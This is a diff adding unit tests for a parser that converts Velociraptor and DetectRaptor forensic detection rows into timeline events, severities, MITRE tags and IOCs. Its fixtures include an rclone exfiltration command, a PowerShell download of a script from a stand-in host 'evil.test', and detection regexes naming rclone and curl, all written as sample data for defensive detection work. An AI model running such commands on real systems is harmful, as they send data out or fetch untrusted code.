@@ -73,6 +73,97 @@ describe("parseVelociraptorJson — detection rows", () => {
   });
 });
 
+// DetectRaptor-style "*.Detection.*" artifacts carry the verdict in a `Detection`/`RuleName`
+// field rather than a Sigma/YARA `Rule`. These rows have no `_Source`.
+describe("parseVelociraptorJson — DetectRaptor detection rows", () => {
+  it("named-pipe hit: Detection string + Exe + PipeName → keyword-escalated High, verdict-first", () => {
+    const row = {
+      EventTime: "2025-03-14T21:25:03Z",
+      Detection: "Cobalt Strike: trick_ryuk.profile",
+      ProcName: "SearchIndexer.exe",
+      Exe: "C:\\Windows\\system32\\SearchIndexer.exe",
+      PipeName: "SearchTextHarvester",
+      Type: "SysmonCreated",
+    };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    expect(r.detections).toBe(1);
+    const e = r.events[0];
+    expect(e.description).toContain("Velociraptor detection: Cobalt Strike: trick_ryuk.profile");
+    expect(e.description).toContain("pipe SearchTextHarvester");
+    expect(e.severity).toBe("High");           // "cobalt strike" keyword
+    expect(e.processName).toBe("SearchIndexer.exe");
+    expect(e.sources).toEqual(["Velociraptor"]);
+    expect(e.timestamp).toContain("2025-03-14T21:25:03");
+    expect(r.iocs.some((i) => i.type === "process" && i.value === "SearchIndexer.exe")).toBe(true);
+  });
+
+  it("Evtx detection: verdict object overlaid on the flat per-EID Windows event", () => {
+    const row = {
+      EventTime: "2025-04-22T11:53:50Z",
+      Computer: "WIN11.windomain.local",
+      Detection: { Name: "T1567.002-Execution of Exfiltration Programs", EventId: "^(4688)$", Regex: "rclone|megacmd" },
+      Channel: "Security",
+      EventID: 4688,
+      EventData: { NewProcessName: "C:\\Windows\\Temp\\rclone.exe", CommandLine: "rclone copy C:\\data remote:exfil", ParentProcessName: "C:\\Windows\\System32\\cmd.exe" },
+      Message: "A new process has been created.",
+    };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    const e = r.events[0];
+    expect(e.description).toContain("Velociraptor detection: T1567.002-Execution of Exfiltration Programs");
+    expect(e.description).toContain("|");                         // overlaid onto the EVTX mapping
+    expect(e.mitreTechniques).toContain("T1567.002");            // from the verdict name
+    expect(e.asset).toBe("WIN11.windomain.local");
+    expect(e.severity === "Medium" || e.severity === "High").toBe(true); // ≥ Medium detection baseline
+    expect(e.sources).toEqual(["Velociraptor"]);
+  });
+
+  it("MFT detection: object verdict with explicit Criticality wins; nested $SI timestamp resolved", () => {
+    const row = {
+      Detection: { Name: "BAU Cloud Data Transfer", KeywordRegex: "OneDrive\\.exe", Criticality: "Low" },
+      OSPath: "\\\\.\\C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+      SITimestamps: { Created0x10: "2021-12-09T17:28:24Z", LastModified0x10: "2026-06-03T08:29:42Z" },
+    };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    const e = r.events[0];
+    expect(e.description).toContain("Velociraptor detection: BAU Cloud Data Transfer");
+    expect(e.severity).toBe("Low");                  // explicit Criticality:"Low" wins over the Medium baseline
+    expect(e.timestamp).toContain("2026-06-03T08:29:42"); // SITimestamps.LastModified0x10
+    expect(e.path).toContain("OneDrive.exe");
+  });
+
+  it("PSReadline: RuleName verdict + command Line → Medium, MITRE from the rule name, FileInfo time", () => {
+    const row = {
+      RuleID: "win_powershell_web",
+      RuleName: "T1059.001-PowerShell Web Request",
+      Line: "Invoke-WebRequest -Uri https://evil.test/x.ps1 -OutFile a.ps1",
+      RuleRegex: "Invoke-WebRequest|iwr |curl ",
+      FileInfo: { OSPath: "C:\\Users\\v\\...\\ConsoleHost_history.txt", Mtime: "2026-06-03T08:40:48Z" },
+    };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    const e = r.events[0];
+    expect(e.description).toContain("Velociraptor detection: T1059.001-PowerShell Web Request");
+    expect(e.description).toContain("Invoke-WebRequest");
+    expect(e.severity).toBe("Medium");
+    expect(e.mitreTechniques).toContain("T1059.001");
+    expect(e.timestamp).toContain("2026-06-03T08:40:48");   // nested FileInfo.Mtime
+    expect(r.iocs.some((i) => i.type === "url" && i.value.includes("evil.test"))).toBe(true);
+  });
+
+  it("downgrades an 'IN DEVELOPMENT' rule to Low and keeps the rule regex out of the description", () => {
+    const row = {
+      Detection: { ID: "win_powershell_encoded_command", Name: "Powershell encoded command - IN DEVELOPMENT", Regex: "[-]e(nc*o*d*e*d*)*\\s+[^-]", HitString: "-enc" },
+      FileInfo: { OSPath: "C:\\Users\\v\\AutoSave\\Untitled1.ps1", Mtime: "2025-03-14T21:56:04Z" },
+      Content: "elastic-agent.exe install --url=http://192.168.56.50:8220 --insecure",
+    };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    const e = r.events[0];
+    expect(e.severity).toBe("Low");
+    expect(e.description).toContain("Powershell encoded command - IN DEVELOPMENT");
+    expect(e.description).not.toContain("nc*o*d*e*d");          // the rule Regex must not leak into the description
+    expect(r.iocs.some((i) => i.type === "ip" && i.value === "192.168.56.50")).toBe(true); // scraped from Content
+  });
+});
+
 describe("parseVelociraptorJson — eventlog & generic rows", () => {
   it("maps a parsed-evtx row per-EID, normalizing the {Value} EventID", () => {
     const r = parseVelociraptorJson(JSON.stringify([eventlogRow()]));
@@ -100,6 +191,21 @@ describe("parseVelociraptorJson — eventlog & generic rows", () => {
     const row = { _Source: "Custom.X", EventTime: "2022-01-01T00:00:00Z", _ts: 1677662400, Message: "hi" };
     const r = parseVelociraptorJson(JSON.stringify([row]));
     expect(r.events[0].timestamp).toBe("2022-01-01T00:00:00Z");
+  });
+
+  it("leads a generic registry/app row with Category/KeyPath and reads KeyLastWriteTimestamp", () => {
+    const row = { Category: "Data Transfer - OneDrive", KeyName: "OneDriveSetup.exe", DisplayName: "Microsoft OneDrive", KeyLastWriteTimestamp: "2025-04-22T11:42:03Z", KeyPath: "HKEY_USERS\\S-1-5-21\\...\\OneDriveSetup.exe" };
+    const r = parseVelociraptorJson(JSON.stringify([row]));
+    const e = r.events[0];
+    expect(e.severity).toBe("Info");
+    expect(e.description).toContain("Data Transfer - OneDrive");   // Category leads, not a key=value dump
+    expect(e.timestamp).toContain("2025-04-22T11:42:03");
+  });
+
+  it("falls back to the supplied artifact label when a row carries no _Source", () => {
+    const row = { Category: "OneDrive", KeyLastWriteTimestamp: "2025-04-22T11:42:03Z" };
+    const r = parseVelociraptorJson(JSON.stringify([row]), { artifact: "DetectRaptor.Windows.Detection.Applications" });
+    expect(r.events[0].description).toContain("[DetectRaptor.Windows.Detection.Applications]");
   });
 });
 
